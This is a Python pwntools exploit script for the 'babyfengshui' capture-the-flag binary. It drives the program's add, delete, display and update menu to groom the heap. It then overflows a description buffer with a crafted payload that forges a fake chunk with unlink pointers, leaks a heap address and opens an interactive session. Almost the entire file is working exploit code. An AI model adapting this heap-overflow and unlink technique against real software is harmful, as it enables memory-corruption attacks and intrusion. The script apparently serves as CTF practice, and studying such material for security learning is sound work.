#!/usr/bin/python

from pwn import *

DEBUG = True

p = process("./babyfengshui")

def r(msg):
  response = p.recvuntil(msg)
  if (DEBUG):
    log.info(response)
  return response

def int_update_description(length, text):
  r("length: ")
  p.sendline(str(length))

  r("text: ")
  p.send(text)

  sleep(0.1)

def add_user(size, name, length, description):
  r("Action: ")
  p.sendline("0")

  r("description: ")
  p.sendline(str(size))

  r("name: ")
  p.sendline(name)

  int_update_description(length, description)

def delete_user(idx):
  r("Action: ")
  p.sendline("1")

  r("index: ")
  p.sendline(str(idx))

def display_user(idx):
  r("Action: ")
  p.sendline("2")

  r("index: ")
  p.sendline(str(idx))

def update_description(idx, length, description):
  r("Action: ")
  p.sendline("3")

  int_update_description(length, description)

SIZE = 0x70
FAST_SIZE = 0x30
NAME_SIZE = 0x7c

ptr = 0x804b080
target = ptr + 0x10

add_user(FAST_SIZE, "A", FAST_SIZE, "A\n")
add_user(FAST_SIZE, "A", FAST_SIZE, "A\n")
add_user(FAST_SIZE, "A", FAST_SIZE, "A\n")

add_user(SIZE, "A", SIZE, "A\n")
add_user(FAST_SIZE, "A", FAST_SIZE, "A\n")
add_user(FAST_SIZE, "A", FAST_SIZE, "A\n")

delete_user(3)

payload = "A" * 0xf8

payload += p32(0)
payload += p32(0x38)
payload += "A" * 0x30

payload += p32(0)
payload += p32(0x88)

payload += p32(0)                 # Fake chunk
payload += p32(0x38 + 0x80 | 1) 
payload += p32(target - 0xc)
payload += p32(target - 0x8)
payload += "A" * 0x70

payload += p32(0)
payload += p32(0x38)
payload += p32(0)
payload += "A" * 0x2c

payload += p32(0x38 + 0x80)
payload += p32(0x88)

add_user(0xf8, "A", len(payload) - 1, payload[:-1])
delete_user(5)

display_user(4)
r("name: ")
heap_leak = u32(r("\n")[:-1])

print "heap leak: 0x%x" % heap_leak

p.interactive()

p.close()
